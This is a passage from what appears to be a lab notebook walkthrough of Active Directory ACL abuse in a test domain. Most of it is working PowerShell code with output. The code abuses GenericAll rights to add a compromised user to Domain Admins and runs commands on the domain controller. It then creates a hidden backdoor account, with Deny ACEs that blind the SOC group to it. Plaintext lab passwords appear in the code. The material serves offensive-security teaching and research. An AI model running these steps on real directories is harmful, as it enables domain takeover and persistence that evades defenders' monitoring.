    "    ForEach ($ACE in $adminSDEntry.ObjectSecurity.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])) {\n",
    "        if ($ACE.IdentityReference.CompareTo($ITAdminsSID) -eq 0) {\n",
    "            $ACE\n",
    "        }\n",
    "    }\n",
    "} finally {\n",
    "    $adminSDEntry.Dispose()\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "GenericAll gives us free reign over the objects it is applied to, so its a simple matter now of adding our compromised account to the domain admins group and establishing domain dominance."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Group Name: Domain Admins\n",
      "Original Members:\n",
      "    CN=SOC,CN=Users,DC=aclabuse,DC=lab\n",
      "    CN=aclAdmin,CN=Users,DC=aclabuse,DC=lab\n",
      "    CN=Administrator,CN=Users,DC=aclabuse,DC=lab\n",
      "\n",
      "Current Members:\n",
      "    CN=SOC,CN=Users,DC=aclabuse,DC=lab\n",
      "    CN=John Dee,OU=EnterpriseUsers,DC=aclabuse,DC=lab\n",
      "    CN=aclAdmin,CN=Users,DC=aclabuse,DC=lab\n",
      "    CN=Administrator,CN=Users,DC=aclabuse,DC=lab\n"
     ]
    }
   ],
   "source": [
    "$domainAdminsSearchResult = Search-Directory -Filter \"(&(objectCategory=group)(cn=Domain Admins))\"\n",
    "\"Group Name: $($domainAdminsSearchResult.Properties.name)\"\n",
    "\"Original Members:\"\n",
    "foreach ($member in $($domainAdminsSearchResult.Properties.member)){\n",
    "    \"    $member\"\n",
    "}\n",
    "\n",
    "try {\n",
    "    $path = $domainAdminsSearchResult.Path\n",
    "    $domainAdminsEntry = New-Object System.DirectoryServices.DirectoryEntry($path, \"aclabuse.lab\\john.dee\", \"johnsPass01\")\n",
    "    $domainAdminsEntry.Add(\"LDAP://CN=John Dee,OU=EnterpriseUsers,DC=aclabuse,DC=lab\")\n",
    "    $domainAdminsEntry.RefreshCache()\n",
    "} finally {\n",
    "    $domainAdminsEntry.Dispose()\n",
    "}\n",
    "\n",
    "$domainAdminsSearchResult = Search-Directory -Filter \"(&(objectCategory=group)(cn=Domain Admins))\"\n",
    "\"`nCurrent Members:\"\n",
    "foreach ($member in $($domainAdminsSearchResult.Properties.member)){\n",
    "    \"    $member\"\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Lets test this by doing something only admins should be able to do; remotely access a DC via PowerShell and start running abitrary commands. The `whoami.exe` command shows the crazy amount of privilege we have acquired in a short space of time."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "USER INFORMATION\n",
      "----------------\n",
      "\n",
      "User Name         SID                                          \n",
      "================= =============================================\n",
      "aclabuse\\john.dee S-1-5-21-463977121-1027363062-1333728264-1104\n",
      "\n",
      "\n",
      "GROUP INFORMATION\n",
      "-----------------\n",
      "\n",
      "Group Name                                      Type             SID                                           Attributes                                                     \n",
      "=============================================== ================ ============================================= ===============================================================\n",
      "Everyone                                        Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group             \n",
      "BUILTIN\\Users                                   Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group             \n",
      "BUILTIN\\Pre-Windows 2000 Compatible Access      Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group             \n",
      "BUILTIN\\Administrators                          Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner\n",
      "NT AUTHORITY\\NETWORK                            Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group             \n",
      "NT AUTHORITY\\Authenticated Users                Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group             \n",
      "NT AUTHORITY\\This Organization                  Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group             \n",
      "aclabuse\\IT Admins                              Group            S-1-5-21-463977121-1027363062-1333728264-1107 Mandatory group, Enabled by default, Enabled group             \n",
      "aclabuse\\DevOps Admins                          Group            S-1-5-21-463977121-1027363062-1333728264-1108 Mandatory group, Enabled by default, Enabled group             \n",
      "aclabuse\\Office Admins                          Group            S-1-5-21-463977121-1027363062-1333728264-1106 Mandatory group, Enabled by default, Enabled group             \n",
      "aclabuse\\Domain Admins                          Group            S-1-5-21-463977121-1027363062-1333728264-512  Mandatory group, Enabled by default, Enabled group             \n",
      "Authentication authority asserted identity      Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group             \n",
      "aclabuse\\Denied RODC Password Replication Group Alias            S-1-5-21-463977121-1027363062-1333728264-572  Mandatory group, Enabled by default, Enabled group, Local Group\n",
      "Mandatory Label\\High Mandatory Level            Label            S-1-16-12288                                                                                                 \n"
     ]
    }
   ],
   "source": [
    "$credential = New-Object PSCredential(\"aclabuse\\john.dee\", $(ConvertTo-SecureString \"johnsPass01\" -AsPlainText -Force))\n",
    "\n",
    "Invoke-Command -ComputerName \"dc01.aclabuse.lab\" -Credential $credential -ScriptBlock {\n",
    "    whoami.exe /user /groups\n",
    "}\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Persistence\n",
    "Now a member of the Domain Admins group, we can try to maintain some sort of domain persistence, should the John.Dee account get noticed as behaving suspciously (which given what we have done with it, is more or less a given at this point). \n",
    "\n",
    "We will create a backdoor account, and set several DENY ACEs on the account in order to blind the SOC to its existence.\n",
    "\n",
    "First we create a container for the account, and explicitly deny the SOC group the ListChildren right on it, then create a hilariously titled account named \"Admin Backdoor\", and explicit deny the SOC group the ListObject right on it."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": []
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "Invoke-Command -ComputerName \"dc01.aclabuse.lab\" -Credential $credential -ScriptBlock {\n",
    "    New-ADObject -name \"TotallyNotABackDoor\" -Type \"Container\"\n",
    "    \n",
    "    $containerPath = (Get-ADObject -Filter {Name -eq 'TotallyNotABackDoor'}).DistinguishedName\n",
    "\n",
    "    $targetDN = \"AD:$containerPath\"\n",
    "    $targetACL = Get-ACL -Path $targetDN\n",
    "    $groupSID = (Get-ADGroup -Identity 'SOC').SID\n",
    "    $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(\n",
    "        $groupSID,\n",
    "        [System.DirectoryServices.ActiveDirectoryRights]::ListChildren,\n",
    "        [System.Security.AccessControl.AccessControlType]::Deny\n",
    "    )\n",
    "    $targetACL.SetAccessRule($ace)\n",
    "    Set-Acl -AclObject $targetACL -Path $targetDN\n",
    "    \n",
    "    New-ADUser -Name 'Admin Backdoor' `\n",
    "        -GivenName 'Ad' -Surname 'Min' `\n",
    "        -SamAccountName 'admin.backdoor' `\n",
    "        -UserPrincipalName ('admin.backdoor@' + $domainName) `\n",
    "        -AccountPassword (ConvertTo-SecureString 'backdoorPass01' -AsPlainText -Force) `\n",
    "        -Path $containerPath -PassThru | Enable-ADAccount\n",
    "\n",
    "    $targetDN =  \"AD:$(Get-ADUser -Identity 'admin.backdoor')\"\n",
    "    $targetACL = Get-ACL -Path $targetDN\n",
    "    $groupSID = (Get-ADGroup -Identity 'SOC').SID\n",
    "    $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(\n",
    "        $groupSID,\n",
    "        [System.DirectoryServices.ActiveDirectoryRights]::ListObject,\n",
    "        [System.Security.AccessControl.AccessControlType]::Deny\n",
    "    )\n",
    "    $targetACL.SetAccessRule($ace)\n",
    "    Set-Acl -AclObject $targetACL -Path $targetDN\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Examining the list of AD users via our compromised account, we can see our newly added Admin Backdoor account."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": []
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "\u001b[32;1mName          \u001b[0m\u001b[32;1m PSComputerName   \u001b[0m\u001b[32;1m RunspaceId\u001b[0m\n",
      "\u001b[32;1m----          \u001b[0m \u001b[32;1m--------------   \u001b[0m \u001b[32;1m----------\u001b[0m\n",
      "Administrator  dc01.aclabuse.lab e3b15659-9cce-49b4-a857-fa97c0d26c44\n",
      "Guest          dc01.aclabuse.lab e3b15659-9cce-49b4-a857-fa97c0d26c44\n",
      "aclAdmin       dc01.aclabuse.lab e3b15659-9cce-49b4-a857-fa97c0d26c44\n",
      "krbtgt         dc01.aclabuse.lab e3b15659-9cce-49b4-a857-fa97c0d26c44\n",
      "John Dee       dc01.aclabuse.lab e3b15659-9cce-49b4-a857-fa97c0d26c44\n",
      "Jane Doe       dc01.aclabuse.lab e3b15659-9cce-49b4-a857-fa97c0d26c44\n",
      "Admin Backdoor dc01.aclabuse.lab e3b15659-9cce-49b4-a857-fa97c0d26c44\n",
      "\n"
     ]
    }
   ],
   "source": [
    "$credential = New-Object PSCredential(\"aclabuse.lab\\john.dee\", $(ConvertTo-SecureString \"johnsPass01\" -AsPlainText -Force))\n",
    "Invoke-Command -ComputerName \"dc01.aclabuse.lab\" -Credential $credential -ScriptBlock {\n",
    "    Get-ADUser -Filter * | select Name\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Compare this to the output when a member of the SOC group examines the list of user accounts..."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": []
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "\u001b[32;1mName         \u001b[0m\u001b[32;1m PSComputerName   \u001b[0m\u001b[32;1m RunspaceId\u001b[0m\n",
      "\u001b[32;1m----         \u001b[0m \u001b[32;1m--------------   \u001b[0m \u001b[32;1m----------\u001b[0m\n",
      "Administrator dc01.aclabuse.lab 5660f315-a112-46e6-8e32-9a8ea6af5764\n",
      "Guest         dc01.aclabuse.lab 5660f315-a112-46e6-8e32-9a8ea6af5764\n",
      "aclAdmin      dc01.aclabuse.lab 5660f315-a112-46e6-8e32-9a8ea6af5764\n",
      "krbtgt        dc01.aclabuse.lab 5660f315-a112-46e6-8e32-9a8ea6af5764\n",
      "John Dee      dc01.aclabuse.lab 5660f315-a112-46e6-8e32-9a8ea6af5764\n",
      "Jane Doe      dc01.aclabuse.lab 5660f315-a112-46e6-8e32-9a8ea6af5764\n",
      "\n"
     ]
    }
   ],
   "source": [
    "$credential = New-Object PSCredential(\"aclabuse.lab\\jane.doe\", $(ConvertTo-SecureString \"janesPass01\" -AsPlainText -Force))\n",
    "Invoke-Command -ComputerName \"dc01.aclabuse.lab\" -Credential $credential -ScriptBlock {\n",
    "    Get-ADUser -Filter * | select Name\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Once again, this is meant to be merely illustrative - this is **not** an opsec safe way of creating an invisible backdoor, but hopefully serves to demonstrate more of the capabilities of these kinds of attack primitives."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Last Words\n",
    "Although a lot of manual recon was performed in this notebook, the entire attack path is viewable, in a much more digestible format, via bloodhound:\n",
    "\n",
    "![aclabuse_attack_path](./Images/aclabuse.png) \n",
    "\n",
    "Interestingly, in its earlier versions bloodhound internally used the ADSI pattern used in this notebook; [it has since switched to a different method](https://blog.cptjesus.com/posts/sharphoundtechnical/#pure-ldap). \n",
    "\n",
    "# Further Reading\n",
    "[An Ace Up the Sleeve: Designing Active Directory DACL Backdoors](https://specterops.io/wp-content/uploads/sites/3/2022/06/an_ace_up_the_sleeve.pdf)\n",
    "\n",
    "https://learn.microsoft.com/en-us/windows/win32/ad/security-contexts-and-active-directory-domain-services\n",
    "\n",
    "https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/4a7705f7-c61e-4020-86a7-41a44fb233e5"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (C#)",
   "language": "C#",
   "name": ".net-csharp"
  },
  "language_info": {
   "name": "csharp"
  },
  "polyglot_notebook": {
   "kernelInfo": {
    "defaultKernelName": "csharp",
    "items": [
     {
      "aliases": [],
      "name": "csharp"
     }
    ]
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
